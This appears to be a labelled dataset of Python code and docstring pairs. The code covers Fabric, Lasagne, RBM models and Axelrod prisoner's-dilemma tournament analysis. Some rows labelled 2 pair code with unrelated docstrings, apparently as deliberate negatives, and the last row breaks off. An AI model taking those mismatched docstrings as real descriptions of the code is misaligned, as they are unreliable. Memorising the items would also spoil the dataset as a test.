1	def load(): def _set_color(load): """ Sets the terminal color for an load average value depending on how high it is. Accepts a string formatted floating point. Returns a formatted string you can print. """ value = float(load) template = "\033[1m\x1b[%sm%s\x1b[0m\033[0m" if value < 1: return template % (32, value) elif value < 3: return template % (33, value) else: return template % (31, value) with hide('everything'): uptime = run("uptime") load = uptime.split(":")[-1] # Split up the load averages and apply a color code to each depending one, five, fifteen = [_set_color(i.strip()) for i in load.split(',')] host = env['host'] # Combine the two things and print out the results output = u'%s: %s' % (host, ", ".join([one, five, fifteen])) print(output)	Prints the current load values. Example usage: $ fab stage load $ fab prod load
1	def links_for_terms(url): response = requests.get(url) text = response.content.decode(response.encoding) soup = bs4.BeautifulSoup(text) result = {} for tag in soup.findAll('a'): if 0 < len(tag.text.split()) < 5: result[tag.text.lower()] = '%s%s' % (url, tag['href']) return result	Given the URL of an HTML document, find things that look like defined terms with IDs; return those terms with links to them, like {'cow': 'http://mypage.html#cow', 'fish': 'http://mypage.html#fish'}
1	def hyperlinked_rst(rst_filename, url): links = links_for_terms(url) with open(rst_filename, 'r') as infile: raw_content = infile.read() cooked_content = [] new_links = set() for raw_line in raw_content.splitlines(): if 'ackage' in raw_line: pass line = raw_line.rstrip() if (indented_two.search(line) and cooked_content and not_indented.search(cooked_content[-1]) and not cooked_content[-1].endswith('_') ): core_term = cooked_content[-1].strip().lower() for term in (core_term, core_term[:-1], '%ss' % core_term): if term in links: new_links.add('.. _`%s`: %s' % (cooked_content[-1], links[term.lower()])) cooked_content[-1] = '`%s`_' % cooked_content[-1] cooked_content.append(raw_line) new_content = '%s\n\n%s' % ('\n'.join(cooked_content), '\n\n'.join(new_links)) return new_content	Finds defined terms in definition lists in ``rst_filename``, finds corresponding linkable anchors in ``url``, returns version of rst with added hyperlinks
1	def build_model(input_dim, output_dim, batch_size): cur_layer = l_in = lasagne.layers.InputLayer( shape=(batch_size,)+ input_dim, ) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=48, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=48, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.MaxPool2DLayer(cur_layer, pool_size=(2, 2)) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=96, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=96, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=96, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.MaxPool2DLayer(cur_layer, pool_size=(2, 2)) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=192, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.Conv2DLayer( cur_layer, num_filters=192, filter_size=(3, 3), nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.MaxPool2DLayer(cur_layer, pool_size=(2, 2)) cur_layer = lasagne.layers.DropoutLayer( cur_layer, p=0.4, ) cur_layer = lasagne.layers.DenseLayer( cur_layer, num_units=256, nonlinearity=lasagne.nonlinearities.rectify, W=lasagne.init.HeUniform(gain='relu'), ) cur_layer = lasagne.layers.DropoutLayer( cur_layer, p=0.4, ) l_out = lasagne.layers.DenseLayer( cur_layer, num_units=output_dim, nonlinearity=lasagne.nonlinearities.softmax, ) return l_out, l_in	Create a symbolic representation of a neural network for facial expression classification. @param input_dim: 3-tuple describing image size (channels, height, width), use (1, 48, 48) @param output_dim: number of classes @param batch_size: use 256 for training on GPU, 1 for evaluation on CPU @return tuple of (output_layer, input_layer), where each layer is a lasagne layer.
1	def get_packages(): packages = ['tribeflow'] for package in packages: base = os.path.join(package, '**/') sub_dirs = glob.glob(base) while len(sub_dirs) != 0: for sub_dir in sub_dirs: package_name = sub_dir.replace('/', '.') if package_name.endswith('.'): package_name = package_name[:-1] packages.append(package_name) base = os.path.join(base, '**/') sub_dirs = glob.glob(base) return packages	Appends all packages (based on recursive sub dirs)
1	def get_extensions(): extensions = [] packages = get_packages() for pkg in packages: pkg_folder = pkg.replace('.', '/') pyx_files = glob.glob(os.path.join(pkg_folder, '*.pyx')) include_dirs = ['tribeflow/myrandom/', numpy.get_include()] for pyx in pyx_files: pxd = pyx.replace('pyx', 'pxd') module = pyx.replace('.pyx', '').replace('/', '.') if os.path.exists(pxd): ext_files = [pyx, pxd] else: ext_files = [pyx] if module == 'tribeflow.myrandom.random': ext_files.append(os.path.join(pkg_folder, 'randomkit.c')) extension = Extension(module, ext_files, include_dirs=include_dirs, extra_compile_args=['-msse', '-msse2', '-mfpmath=sse', \ '-fopenmp', '-Wno-unused-function'], #cython warnings supress extra_link_args=['-fopenmp']) extensions.append(extension) return extensions	Get's all .pyx and.pxd files
1	def save_model(out_fpath, model): store = pd.HDFStore(out_fpath, 'w') for model_key in model: model_val = model[model_key] if type(model_val) == np.ndarray: store[model_key] = pd.DataFrame(model_val) else: store[model_key] = pd.DataFrame(model_val.items(), \ columns=['Name', 'Id']) store.close()	Saves the given model to out_fpath. The model is simply a map of string keys, numpy array or dict values. Nothing else is supported. key -> array key -> dict Only. Parameters ---------- out_fpath : string Where to save the model model : dict The actual model
1	from_=0, to=np.inf, initial_assign=None): count_zh_dict = defaultdict(int) count_oz_dict = defaultdict(int) count_z_dict = defaultdict(int) count_h_dict = defaultdict(int) hyper2id = OrderedDict() obj2id = OrderedDict() if initial_assign: initial_assign = np.asarray(initial_assign, dtype='i') assert initial_assign.min() >= 0 assert initial_assign.max() < num_topics Dts = [] Trace = [] with open(trace_fpath, 'r') as trace_file: for i, line in enumerate(trace_file): if i < from_: continue if i >= to: break spl = line.strip().split('\t') assert len(spl) >= 4 assert (len(spl) - 2) % 2 == 0 mem_size = (len(spl) - 2) // 2 line_dts = [] for j in xrange(mem_size): line_dts.append(float(spl[j])) Dts.append(line_dts) hyper_str = spl[mem_size] if hyper_str not in hyper2id: hyper2id[hyper_str] = len(hyper2id) if not initial_assign: z = np.random.randint(num_topics) else: z = initial_assign[i] h = hyper2id[hyper_str] count_zh_dict[z, h] += 1 count_h_dict[h] += 1 line_int = [h] for j in xrange(mem_size + 1, len(spl)): obj_str = spl[j] if obj_str not in obj2id: obj2id[obj_str] = len(obj2id) o = obj2id[obj_str] line_int.append(o) count_oz_dict[o, z] += 1 count_z_dict[z] += 1 line_int.append(z) Trace.append(line_int) Dts = np.asarray(Dts) argsort = Dts[:, -1].argsort() assert Dts.shape[1] == mem_size Dts = np.asanyarray(Dts[argsort], order='C') Trace = np.asarray(Trace) Trace = np.asanyarray(Trace[argsort], dtype='i4', order='C') nh = len(hyper2id) no = len(obj2id) nz = num_topics previous_stamps = StampLists(num_topics) for z in xrange(nz): idx = Trace[:, -1] == z topic_stamps = Dts[:, -1][idx] previous_stamps._extend(z, topic_stamps) Count_zh = np.zeros(shape=(nz, nh), dtype='i4') Count_oz = np.zeros(shape=(no, nz), dtype='i4') count_h = np.zeros(shape=(nh,), dtype='i4') count_z = np.zeros(shape=(nz,), dtype='i4') for z in xrange(Count_zh.shape[0]): count_z[z] = count_z_dict[z] for h in xrange(Count_zh.shape[1]): count_h[h] = count_h_dict[h] Count_zh[z, h] = count_zh_dict[z, h] for o in xrange(Count_oz.shape[0]): Count_oz[o, z] = count_oz_dict[o, z] assert (Count_oz.sum(axis=0) == count_z).all() prob_topics_aux = np.zeros(nz, dtype='f8') Theta_zh = np.zeros(shape=(nz, nh), dtype='f8') Psi_oz = np.zeros(shape=(no, nz), dtype='f8') return Dts, Trace, previous_stamps, Count_zh, Count_oz, \ count_h, count_z, prob_topics_aux, Theta_zh, Psi_oz, \ hyper2id, obj2id	Given a trace (user trajectories) to learn from, this method will initialize the necessary matrices and dicts to learn tribeflow. Using from_, to_ the trace can be sliced. initial_assign is useful to pickup learning from a previous model. Parameters ---------- trace_fpath : string The location of the trace num_topics : int The number of latent spaces from_ : int Where to begin reading the trace from. 0 is the first line. to : int We will stop reading the file here initial_assign : array-like Initial topic assignments. Returns ------- Count matrices and dicts used to learn tribeflow.
1	def filtered_history_files(files): if not settings.get('show_full_path', True): return [os.path.split(f)[1] for f in files] else: return files	Only show file name in quick panel, not path
2	class UltraMagicString(object): def __init__(self, value): if not isinstance(value, bytes): value = value.encode('utf8') self.value = value def __bytes__(self): return self.value def __unicode__(self): return self.value.decode('UTF-8') if sys.version_info[0] < 3: __str__ = __bytes__ else: __str__ = __unicode__ def __add__(self, other): return UltraMagicString(self.value + bytes(other)) def split(self, *args, **kw): return str(self).split(*args, **kw) long_description = UltraMagicString('\n\n'.join((	Taken from http://stackoverflow.com/questions/1162338/whats-the-right-way-to-use-unicode-metadata-in-setup-py
1	class ConsoleAndFileLogger(object): def __init__(self, filename='logfile.log', mode='w', stream=sys.stdout): assert mode in ['w', 'a'] assert hasattr(stream, 'write') and hasattr(stream, 'flush') # basic check for valid stream, because redirecting sys.stdout,stderr to invalid Logger can cause trace not to be printed self.stream = stream self.file = open(filename, mode) self.linebuf = '' def __del__(self): try: if len(self.linebuf) > 0: self.file.write(self.linebuf) self.file.flush() self.file.close() except: pass # file may be closed, unavailable, etc. def write(self, message): try: self.stream.write(message) self.stream.flush() except: pass # stream may be closed, unavailable, etc. for c in message: if c == '\b': self.linebuf = self.linebuf[:-1] elif c == '\n': self.linebuf += c if len(self.linebuf) > 0: try: self.file.write(self.linebuf) self.file.flush() except: pass # file may be closed, unavailable, etc. self.linebuf = '' elif c == '\r': self.linebuf = '' else: self.linebuf += c def flush(self): pass # already flushes each write	Logging helper which prints to a file and a stream (e.g. stdout) simultaneously. Can be used to redirect standard streams (sys.stdout, sys.stderr), so print(), warnings.warn(), raise exceptions, etc., will be logged to console and file at the same time. Logging to file is done with a line buffer to allow updating lines for things like progress bars.
1	def sample_x_given_h(self, h): x_mean = K.dot(h, self.W.T) + self.bx x_samp = x_mean return x_samp, x_samp, x_samp	Draw sample from p(x|h). For Gaussian-Bernoulli RBM the conditional probability distribution can be derived to be p(x_i|h) = norm(x_i; sigma_i W[i,:] h + bx_i, sigma_i^2).
1	def reconstruction_loss(self, nb_gibbs_steps=1): def loss(x): x_rec, _, _ = self.mcmc_chain(x, nb_gibbs_steps) return K.mean(K.sqr(x - x_rec)) return loss	Compute mean squared error between input data and the reconstruction generated by the model. Result is a Theano expression with the form loss = f(x). Useful as a rough indication of training progress (see Hinton2010). Mean over samples and feature dimensions.
1	def get_x_given_h_layer(self, as_initial_layer=False): if not as_initial_layer: layer = Dense(output_dim=self.input_dim, activation='linear', weights=[self.W.get_value().T, self.bx.get_value()]) else: layer = Dense(input_dim=self.hidden_dim, output_dim=self.input_dim, activation='linear', weights=[self.W.get_value().T, self.bx.get_value()]) return layer	Generates a new Dense Layer that computes mean of Gaussian distribution p(x|h).
1	class GBRBM(RBM): def __init__(self, input_dim, hidden_dim, init='glorot_uniform', weights=None, name=None, W_regularizer=None, bx_regularizer=None, bh_regularizer=None, #activity_regularizer=None, W_constraint=None, bx_constraint=None, bh_constraint=None): super(GBRBM, self).__init__(input_dim, hidden_dim, init, weights, name, W_regularizer, bx_regularizer, bh_regularizer, #activity_regularizer, W_constraint, bx_constraint, bh_constraint) def free_energy(self, x): wx_b = K.dot(x, self.W) + self.bh vbias_term = 0.5*K.sum((x - self.bx)**2, axis=1) hidden_term = K.sum(K.log(1 + K.exp(wx_b)), axis=1) return -hidden_term + vbias_term def sample_x_given_h(self, h): """ Draw sample from p(x|h). For Gaussian-Bernoulli RBM the conditional probability distribution can be derived to be p(x_i|h) = norm(x_i; sigma_i W[i,:] h + bx_i, sigma_i^2). """ x_mean = K.dot(h, self.W.T) + self.bx x_samp = x_mean return x_samp, x_samp, x_samp def reconstruction_loss(self, nb_gibbs_steps=1): """ Compute mean squared error between input data and the reconstruction generated by the model. Result is a Theano expression with the form loss = f(x). Useful as a rough indication of training progress (see Hinton2010). Mean over samples and feature dimensions. """ def loss(x): x_rec, _, _ = self.mcmc_chain(x, nb_gibbs_steps) return K.mean(K.sqr(x - x_rec)) return loss def get_x_given_h_layer(self, as_initial_layer=False): """ Generates a new Dense Layer that computes mean of Gaussian distribution p(x|h). """ if not as_initial_layer: layer = Dense(output_dim=self.input_dim, activation='linear', weights=[self.W.get_value().T, self.bx.get_value()]) else: layer = Dense(input_dim=self.hidden_dim, output_dim=self.input_dim, activation='linear', weights=[self.W.get_value().T, self.bx.get_value()]) return layer	Gaussian-Bernoulli Restricted Boltzmann Machine (GB-RBM). This GB-RBM does not learn variances of Gaussian units, but instead fixes them to 1 and uses noise-free reconstructions. Input data should be pre-processed to have zero mean and unit variance along the feature dimensions. See: Hinton, "A Practical Guide to Training Restricted Boltzmann Machines", UTML TR 2010-003, 2010, section 13.2.
1	class log_to_file(object): def __init__(self, filename, mode='w', stream=sys.stdout): self.filename = filename self.mode = mode self.stream = stream def __call__(self, original_func): decorator_self = self def wrapped(*args, **kwargs): old_stdout = sys.stdout old_stderr = sys.stderr _mkdir(os.path.dirname(self.filename)) logger = ConsoleAndFileLogger(self.filename, self.mode, self.stream) sys.stdout.flush() sys.stderr.flush() sys.stdout = logger sys.stderr = logger result = original_func(*args, **kwargs) sys.stdout = old_stdout sys.stderr = old_stderr return result return wrapped	Log to file decorator. Example ------- >>> @log_to_file('main.log', mode='a') >>> def main(): >>> print('hello world!')
1	class MomentumScheduler(Callback): def __init__(self, schedule): super(MomentumScheduler, self).__init__() self.schedule = schedule def on_epoch_begin(self, epoch, logs={}): cur_momentum = self.model.optimizer.momentum.get_value() new_momentum = self.schedule(epoch) if not np.isclose(new_momentum, cur_momentum) or epoch == 0: self.model.optimizer.momentum.set_value(new_momentum) print('Changed momentum to: %.3f' % self.model.optimizer.momentum.get_value()) import numpy as np	Simple Callback that changes momentum, e.g. 0.5 for first 5 epochs, then 0.9. Example: optimizer = SGD(lr=0.001, momentum=0., decay=0.0, nesterov=False) momentum_schedule = make_stepped_schedule([(0, 0.5), (5, 0.9)]) momentum_scheduler = MomentumScheduler(momentum_schdule) model = ... model.compile(optimizer, loss) model.fit(..., callbacks=[momentum_scheduler]) See: Hinton, "A Practical Guide to Training Restricted Boltzmann Machines", UTML TR 2010-003, 2010, section 9.1.
1	def free_energy(self, x): wx_b = K.dot(x, self.W) + self.bh hidden_term = K.sum(K.log(1 + K.exp(wx_b)), axis=1) vbias_term = K.dot(x, self.bx) return -hidden_term - vbias_term	Compute free energy for Bernoulli RBM, given visible units. The marginal probability p(x) = sum_h 1/Z exp(-E(x, h)) can be re-arranged to the form p(x) = 1/Z exp(-F(x)), where the free energy F(x) = -sum_j=1^H log(1 + exp(x^T W[:,j] + bh_j)) - bx^T x, in case of the Bernoulli RBM energy function.
1	def sample_h_given_x(self, x): h_pre = K.dot(x, self.W) + self.bh h_sigm = K.sigmoid(h_pre) h_samp = random_binomial(shape=h_sigm.shape, n=1, p=h_sigm) return h_samp, h_pre, h_sigm	Draw sample from p(h|x). For Bernoulli RBM the conditional probability distribution can be derived to be p(h_j=1|x) = sigmoid(x^T W[:,j] + bh_j).
1	def sample_x_given_h(self, h): x_pre = K.dot(h, self.W.T) + self.bx x_sigm = K.sigmoid(x_pre) x_samp = random_binomial(shape=x_sigm.shape, n=1, p=x_sigm) return x_samp, x_pre, x_sigm	Draw sample from p(x|h). For Bernoulli RBM the conditional probability distribution can be derived to be p(x_i=1|h) = sigmoid(W[i,:] h + bx_i).
1	class TransformerLayer(lasagne.layers.MergeLayer): def __init__(self, incoming, downsample_factor=1, **kwargs): super(TransformerLayer, self).__init__(incoming, **kwargs) self.downsample_factor = downsample_factor conv_shp, A_shp = self.input_shapes if conv_shp[0] != A_shp[0]: raise ValueError("Number of batchs in conv_shp and A_shp must " if A_shp[-1] != 6: raise ValueError("The A network must have 6 outputs") def get_output_shape_for(self, input_shapes): shp = input_shapes[0] return list(shp[:2]) + [ int(s//self.downsample_factor) for s in shp[2:]] def get_output_for(self, inputs, deterministic=False, **kwargs): conv_input, theta = inputs output = _transform(theta, conv_input, self.downsample_factor) return output def _repeat(x, n_repeats):	Spatial Transformer Layer Implements a spatial transformer layer as described in [1]_. Parameters ---------- incomings : a list of [:class:`Layer` instance or a tuple] The layers feeding into this layer. The list must have two entries with the first network being a convolutional net and the second layer being the transformation matrices. The first network should have output shape [num_batch, num_channels, height, width]. The output of the second network should be [num_batch, 6]. downsample_fator : float A value of 1 will keep the orignal size of the image. Values larger than 1 will down sample the image. Values below 1 will upsample the image. example image: height= 100, width = 200 downsample_factor = 2 output image will then be 50, 100 References ---------- .. [1] Spatial Transformer Networks Max Jaderberg, Karen Simonyan, Andrew Zisserman, Koray Kavukcuoglu Submitted on 5 Jun 2015 Notes ----- To initialize the network to the identity transform init the ``localization_network`` to something similar to: b = np.zeros((2, 3), dtype='float32') b[0, 0] = 1 b[1, 1] = 1 b = b.flatten() And W to zero. W = lasagne.init.Constant(0.0) Examples -------- TODO
1	class CooperationAggregator(object): def __init__(self): self.mapping = {'C': 1, 'D': 0} self.counts = [] self.rows = 0 def add_data(self, row1, row2): if not self.counts: self.counts = [0] * len(row1) for i, play in enumerate(row1): self.counts[i] += self.mapping[play] self.rows += 1 def normalize(self): return numpy.array(self.counts) / float(self.rows) class OpponentCooperationAggregator(object):	Aggregates the cooperation probability per round over many histories.
1	class OpponentCooperationAggregator(object): def __init__(self): self.mapping = {'C': 1, 'D': 0} self.counts = [] self.rows = 0 def add_data(self, row1, row2): if not self.counts: self.counts = [0] * len(row2) for i, play in enumerate(row2): self.counts[i] += self.mapping[play] self.rows += 1 def normalize(self): return numpy.array(self.counts) / float(self.rows) class ScoreAggregator(object):	Aggregates the cooperation probability of the opponent per round over many histories.
1	class ScoreAggregator(object): def __init__(self): game = axelrod.Game() self.mapping = game.scores self.counts = [] self.rows = 0 def add_data(self, row1, row2): if not self.counts: self.counts = [0] * len(row1) for i, (play1, play2) in enumerate(zip(row1, row2)): play = (play1, play2) self.counts[i] += self.mapping[play][0] self.rows += 1 def normalize(self): return numpy.array(self.counts) / float(self.rows) class ScoreDiffAggregator(object):	Aggregates the mean score per round over many histories.
1	class ScoreDiffAggregator(object): def __init__(self): game = axelrod.Game() self.mapping = game.scores self.counts = [] self.rows = 0 def add_data(self, row1, row2): if not self.counts: self.counts = [0] * len(row1) for i, (play1, play2) in enumerate(zip(row1, row2)): play = (play1, play2) self.counts[i] += self.mapping[play][0] - self.mapping[play][1] self.rows += 1 def normalize(self): return numpy.array(self.counts) / float(self.rows) def aggregated_data(player, opponents, aggClass=None, noise=None):	Aggregates the mean score difference per round over many histories.
1	def ensure_directory(directory): head, tail = os.path.split(directory) if head: ensure_directory(head) if not os.path.isdir(directory): os.mkdir(directory)	Makes sure that a directory exists and creates it if it does not.
1	def axelrod_strategies(cheaters=False, meta=False, transformer=None): s = [s for s in axelrod.all_strategies if axelrod.obey_axelrod(s())] if cheaters: s.extend(axelrod.cheating_strategies) if not meta: s = [t for t in s if not ( t.__name__.startswith("Meta") or t.__name__.startswith("NiceMeta") or t.__name__.startswith("NMW"))] if transformer: s = [transformer(t)() for t in s] else: s = [t() for t in s] s.sort(key=str) return s	Obtains the list of strategies from Axelrod library.
2	def deterministic_strategies(): strategies = [] for s in axelrod_strategies(): if not s.classifier["stochastic"]: strategies.append(s) return strategies	Blast query file against db using default settings.
2	def stochastic_strategies(): strategies = [] for s in axelrod_strategies(): if s.classifier["stochastic"]: strategies.append(s) return strategies	Blast query file against db using default settings.
1	def finite_memory_strategies(lower=0, upper=float('inf')): strategies = [] for s in axelrod_strategies(): memory_depth = s.classifier['memory_depth'] if memory_depth >= lower and memory_depth < upper: strategies.append(s) return strategies	Filter strategies down to those that have finite memory_depth.
1	def memoryone_strategies(): return finite_memory_strategies(lower=0, upper=2)	Filter strategies down to those that are memoryone, that is having memory_depth 0 or 1.
1	def tscizzle_strategies(): strategies = [ axelrod.Cooperator(), axelrod.Defector(), axelrod.Eatherley(), axelrod.Champion(), axelrod.GTFT(p=0.1), axelrod.GTFT(p=0.3), axelrod.GoByMajority(soft=True), axelrod.GoByMajority(soft=False), axelrod.TitFor2Tats(), axelrod.Random(0.8), axelrod.Random(0.5), axelrod.Random(0.2), axelrod.WinStayLoseShift(), # Pavlov axelrod.TitForTat(), axelrod.TwoTitsForTat(), axelrod.Grudger(), # Friedman axelrod.Tester(), axelrod.SuspiciousTitForTat(), axelrod.Joss(0.9), axelrod.Joss(0.7), ] return strategies	The list of strategies used in @tscizzle's Morality Metrics paper.
1	def sp_strategies(): strategies = [ axelrod.Cooperator(), # ALLC axelrod.Defector(), # ALLD axelrod.GTFT(), axelrod.GoByMajority(soft=False), # HARD_MAJO axelrod.TitFor2Tats(), # TFT2 axelrod.HardTitFor2Tats(), # HARD_TFT2 axelrod.Random(), # RANDOM axelrod.WinStayLoseShift(), # WSLS axelrod.TitForTat(), axelrod.HardTitForTat(), # HARD_TFT axelrod.Grudger(), # GRIM axelrod.Joss(), # HARD_JOSS axelrod.ZDGTFT2(), axelrod.ZDExtort2(), axelrod.Prober(), axelrod.Prober2(), axelrod.Prober3(), axelrod.HardProber(), axelrod.Calculator(), ] return strategies	The list of strategies used in Stewart and Plotkin's 2012 tournament.
2	def all_plots(label, results, filename_suffix, file_format, output_directory): plot = axl.Plot(results) f = plot.boxplot(title="Payoff " + label) filename = os.path.join(output_directory, "{}_boxplot.{}".format(filename_suffix, file_format)) f.savefig(filename) plt.close(f) f = plot.payoff(title="Payoff " + label) filename = os.path.join(output_directory, "{}_payoff.{}".format(filename_suffix, file_format)) f.savefig(filename) plt.close(f) f = plot.winplot(title="Wins " + label) filename = os.path.join(output_directory, "{}_winplot.{}".format(filename_suffix, file_format)) f.savefig(filename) plt.close(f) f = plot.sdvplot(title="Payoff differences " + label) filename = os.path.join(output_directory, "{}_sdvplot.{}".format(filename_suffix, file_format)) f.savefig(filename) plt.close(f) f = plot.pdplot(title="Payoff differences " + label) filename = os.path.join(output_directory, "{}_pdplot.{}".format(filename_suffix, file_format)) f.savefig(filename) plt.close(f)	find index of the 'n'th occurence of 'element' in'string'
1	def fet_tests(data_dict): C_count = sum(v[0] for (k, v) in data_dict.items()) D_count = sum(v[1] for (k, v) in data_dict.items()) test_results = dict() for context in data_dict.keys(): C_count_context = data_dict[context][0] D_count_context = data_dict[context][1] table = numpy.array([[C_count, D_count], [C_count_context, D_count_context]]) test_stat, pvalue = stats.fisher_exact(table) test_results[context] = (test_stat, pvalue) return test_results	Performs four Fisher exact tests on each possible context.
1	def memory_one_estimate(data_dict): estimates = dict() for context in data_dict.keys(): C_count = data_dict[context][0] D_count = data_dict[context][1] try: estimates[context] = float(C_count) / (C_count + D_count) except ZeroDivisionError: estimates[context] = None return estimates	Estimates the memory one strategy probabilities from the observed data.
1	def collect_data(opponent): player = axelrod.Random(0.5) while True: player.play(opponent) yield (player.history[-1], opponent.history[-1])	Generator to collect data from opponent.
1	def infer_depth(opponent, test_rounds=200): data_dict = {(C, C): [0, 0], (C, D): [0, 0], (D, C): [0, 0], (D, D): [0, 0]} history = [] for turn in islice(collect_data(opponent), test_rounds + 1): history.append(turn) if len(history) < 2: continue context = history[-2] context = (context[1], context[0]) if turn[1] == C: data_dict[context][0] += 1 else: data_dict[context][1] += 1 test_results = fet_tests(data_dict) estimate = memory_one_estimate(data_dict) return data_dict, test_results, estimate	Collect data and report statistical tests.
1	def counter_mean(counter): mean = 0. total = 0. for k, v in counter.items(): if k <= 0: k = 200 mean += k * v total += v return mean / total	Takes the mean of a collections.Counter object (or dictionary).
2	def normalized_name(player): player_name = str(player) return player_name	Return a list of queries with lower than cutoff identity or duplicated and a dictionary with the best hits.
1	def game_extremes(): game = axelrod.Game() scores = game.RPST() return min(scores), max(scores)	Returns the max and min game matrix values to set the colorbar endpoints.
1	def unzip(l): return zip(*l)	Unpacks a list of tuples pairwise to a lists of lists: [('a', 1), ('b', 2)] becomes [['a', 'b'], [1, 2]]
1	def csv_filename(player, opponent, noise=None): filename = "{}--{}.csv".format(normalized_name(player), normalized_name(opponent)) if noise: path = Path("assets") / "csv" / "matches-noisy" / filename else: path = Path("assets") / "csv" / "matches" / filename return path	Provides a standardized filename for storing and loading match data.
1	def load_match_csv(player, opponent, noise=None): reverse = False filename = csv_filename(player, opponent, noise=noise) path = Path(filename) if not path.exists(): filename = csv_filename(opponent, player, noise=noise) path = Path(filename) if not path.exists(): raise FileNotFoundError("No match data found") reverse = True with path.open('r') as csvfile: reader = csv.reader(csvfile) index0, index1 = 0, 1 if reverse: index0, index1 = 1, 0 for row in reader: yield [(elem[index0], elem[index1]) for elem in row]	Loads a cached CSV file. Returns a list of lists of match plays: [ [('C', 'D'), ('C', 'C'), ... ], ... ] This function will also attempt to change the order if the data is not found, since swapping player and opponent will only change the order of plays.
1	def write_match_to_csv(data, filename): path = Path(filename) with path.open('w') as csvfile: writer = csv.writer(csvfile) for row in data: csv_row = ["".join(element) for element in row] writer.writerow(csv_row)	Takes match data (or a generator) and writes the data to a csv file.
1	noise=None): if not noise: noise = 0 if player == opponent: opponent = opponent.clone() tournament_attributes = {'length': turns, 'game': axelrod.Game()} player.tournament_attributes = tournament_attributes opponent.tournament_attributes = tournament_attributes row = [] for _ in range(repetitions): row = [] player.reset() opponent.reset() for _ in range(turns): player.play(opponent, noise=noise) yield zip(player.history, opponent.history)	Generates match date between two players. Yields rows of the form [(C, D), (C, C), ...].
1	def save_all_match_results(players, turns=200, repetitions=100, noise=0): for p1, p2 in itertools.combinations_with_replacement(players, 2): print(p1, p2) if is_deterministic(p1, p2, noise): repetitions_ = 1 else: repetitions_ = repetitions data = generate_match_results(p1, p2, turns=turns, repetitions=repetitions_, noise=noise) filename = csv_filename(p1, p2, noise=noise) write_match_to_csv(data, filename)	Caches match results for all pairs of players
1	def aggregated_data(player, opponents, aggClass=None, noise=None): data = [] for i, opponent in enumerate(opponents): aggregator = aggClass() match_data = load_match_csv(player, opponent, noise=noise) for row in match_data: history1, history2 = unzip(row) aggregator.add_data(history1, history2) averages = aggregator.normalize() data.append((i, averages)) return data	Aggregates cached data for player versus every opponent for plotting.
1	def aggregated_data_to_csv(players, opponents, noise=None): for name, aggClass in [("score", ScoreAggregator), ("score_diff", ScoreDiffAggregator), ("cooperation", CooperationAggregator), ("opponent_cooperation", OpponentCooperationAggregator) ]: for player in players: data = aggregated_data(player, opponents, aggClass=aggClass, noise=noise) filename = normalized_name(player) if noise: filename += "_noisy" filename += ".csv" path = Path("assets") / "csv" / name / filename with path.open('w') as csvfile: writer = csv.writer(csvfile) for i, row in enumerate(data): csv_row = [normalized_name(opponents[i])] csv_row.extend(row[-1]) writer.writerow(csv_row)	Aggregates cached data for player versus every opponent for plotting.
1	vmin=0, vmax=1,): if not cmap: cmap = plt.get_cmap("RdBu") if sort: data.sort(key=itemgetter(1)) sort_order = [x[0] for x in data] else: sort_order = range(len(opponents)) data = [x[-1] for x in data] data = numpy.array(data) player_name = normalized_name(player) plt.clf() fig, ax = plt.subplots() figure = ax.get_figure() height = 16 width = 24 figure.set_size_inches(width, height) try: sm = ax.pcolor(data, cmap=cmap, vmin=vmin, vmax=vmax) except: plt.close(fig) return ax.set_ylim(0, len(opponents)) yticks = [str(opponents[sort_order[i]]) for i in range(len(opponents))] ax.set_title(player_name) plt.yticks([y + 0.5 for y in range(len(yticks))], yticks) cbar = plt.colorbar(sm, ax=ax) plt.xlabel("Rounds") filename = os.path.join(directory, "%s.png" % (player_name,)) ax.tick_params(axis='both', which='both', labelsize=8) plt.tight_layout() plt.savefig(filename, dpi=200) plt.close(fig)	Plots the average (e.g.) cooperate rate or score per turn for `player` versus every opponent in `opponents`.
1	def summarize_matchup(player, opponent, initial=10): game = axelrod.Game() scores = [] score_diffs = [] match_data = load_match_csv(player, opponent) context_dict = defaultdict(float) context_counts = defaultdict(float) initial_plays = [0] * initial total_plays = 0 total_matches = 0 match_length = 0 first_defection = defaultdict(int) for row in match_data: match_length = len(row) total_matches += 1 total_plays += len(row) score = 0 score_diff = 0 for play1, play2 in row: s = game.scores[(play1, play2)] score += s[0] score_diff += s[0] - s[1] if play1 == "C": context_dict["C_prob"] += 1 scores.append(score) score_diffs.append(score_diff) for i in range(1, len(row)): plays = row[i] key = row[i - 1] context_counts[key] += 1 if plays[0] == "C": context_dict[key] += 1 for i in range(2, len(row)): plays = row[i] key = (row[i - 2], row[i - 1]) context_counts[key] += 1 if play1 == "C": context_dict[key] += 1 for i in range(len(initial_plays)): play = row[i][0] if play == "C": initial_plays[i] += 1 my_history = "".join([x[0] for x in row]) first_occurrence = my_history.find('D') first_defection[first_occurrence + 1] += 1 initial_plays = numpy.array(initial_plays) / float(total_matches) context_dict["C_prob"] /= float(total_plays) contexts = [(C, C), (C, D), (D, C), (D, D)] for context in contexts: try: context_dict[context] /= context_counts[context] except ZeroDivisionError: context_dict[context] = "NA" for context in itertools.product(contexts, repeat=2): try: context_dict[context] /= context_counts[context] except ZeroDivisionError: context_dict[context] = "NA" for key in context_counts.keys(): if key == "C_prob": continue total = sum([float(v) for (k, v) in context_counts.items() if len(k[0]) == len(key[0])]) context_counts[key] /= total scores = numpy.array(scores) / float(match_length) mean_score = numpy.mean(scores) std_score = numpy.std(scores) score_diffs = 